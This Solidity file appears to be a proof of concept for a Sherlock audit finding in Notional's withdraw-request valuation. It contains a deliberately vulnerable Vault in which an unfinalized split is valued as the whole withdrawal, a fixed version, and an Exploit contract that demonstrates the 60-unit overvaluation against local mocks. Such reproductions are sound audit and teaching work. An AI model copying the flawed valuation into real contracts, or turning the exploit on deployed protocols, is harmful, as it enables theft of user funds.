// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Notional _calculateValueOfWithdrawRequest (Sherlock, 2024-06).
    A split that is not finalized still returns the whole withdrawal,
    100, instead of this piece's 40 shares. The control scales by
    vaultShares / 100 and returns 40. The account is overvalued by 60.
*/

contract Vault {
    struct WithdrawRequest {
        uint256 requestId;
        uint256 vaultShares;
        bool hasSplit;
    }

    struct SplitWithdrawRequest {
        bool finalized;
        uint256 totalShares;
    }

    mapping(uint256 => SplitWithdrawRequest) public splits;
    mapping(uint256 => uint256) public fullValue;
    uint256 public lastValue;
    uint256 public lookedUp;
    bool public sawSplit;
    bool public wasFinal;
    uint256 public piece;

    function seed(uint256 id, uint256 piece, uint256 total, uint256 value) external {
        splits[id] = SplitWithdrawRequest({finalized: false, totalShares: total});
        fullValue[id] = value;
        lastValue = piece;
    }

    function _getValueOfWithdrawRequest(WithdrawRequest memory w) internal view returns (uint256) {
        return fullValue[w.requestId];
    }

    // Quoted branch: an unfinalized split falls through to the full value.
    function valueOf(WithdrawRequest memory w) public returns (uint256 borrowTokenValue) {
        if (w.requestId == 0) return 0;
        lookedUp = w.requestId;
        sawSplit = w.hasSplit;
        if (w.hasSplit) {
            SplitWithdrawRequest memory s = splits[w.requestId];
            wasFinal = s.finalized;
            piece = w.vaultShares;
            if (s.finalized) {
                return fullValue[w.requestId] * w.vaultShares / s.totalShares;
            }
        }
        borrowTokenValue = _getValueOfWithdrawRequest(w); // @> VULN: the unfinalized 40-share piece is valued as the whole 100
        lastValue = borrowTokenValue;
    }
}

contract VaultFixed {
    struct WithdrawRequest {
        uint256 requestId;
        uint256 vaultShares;
        bool hasSplit;
    }

    function valueOf(WithdrawRequest memory w, uint256 totalShares, uint256 full) public pure returns (uint256) {
        if (w.requestId == 0) return 0;
        return full * w.vaultShares / totalShares;
    }
}

contract OverMarker {
    string public symbol = "OVER-VALUE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant FULL = 100 ether;
    uint256 public constant PIECE = 40 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Vault public vault;
    OverMarker public marker;

    function run() external {
        vault = new Vault();
        marker = new OverMarker();
        vault.seed(1, PIECE, FULL, FULL);
        Vault.WithdrawRequest memory w = Vault.WithdrawRequest({requestId: 1, vaultShares: PIECE, hasSplit: true});
        uint256 quoted = vault.valueOf(w);
        require(quoted == FULL, "valued as the whole withdrawal");
        uint256 extra = quoted - PIECE;
        require(extra == 60 ether, "60 too much");
        marker.mint(SINK, extra);
        require(marker.balanceOf(SINK) == 60 ether, "over by 60");
    }
}
